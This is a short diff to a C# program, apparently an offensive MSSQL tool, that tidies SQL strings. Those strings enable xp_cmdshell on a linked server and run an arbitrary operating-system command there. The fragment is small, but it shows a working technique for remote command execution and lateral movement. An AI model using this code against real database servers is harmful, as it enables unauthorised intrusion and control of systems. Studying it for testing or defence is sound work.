@@ -1,7 +1,7 @@
-﻿using System;
+using System;
 using System.Data.SqlClient;
 
-namespace MSSQL
+namespace SQL
 {
     class Program
     {
@@ -214,9 +214,9 @@ namespace MSSQL
         {
             try
             {
-                String enableadvoptions = $"EXEC ('sp_configure ''show advanced options'' , 1; reconfigure;') AT {server}";
-                String enablexpcmdshell = $"EXEC ('sp_configure ''xp_cmdshell'' , 1; reconfigure;') AT {server}";
-                String execCmd = $"EXEC ('xp_cmdshell ''{command}'';') AT {server}";
+                String enableadvoptions = $"EXEC ('sp_configure ''show advanced options'' , 1; reconfigure;') AT [{server}]";
+                String enablexpcmdshell = $"EXEC ('sp_configure ''xp_cmdshell'' , 1; reconfigure;') AT [{server}]";
+                String execCmd = $"EXEC ('xp_cmdshell ''{command}'';')AT [{server}]";
 
                 SqlCommand cmd = new SqlCommand(enableadvoptions, con);
                 SqlDataReader reader = cmd.ExecuteReader();
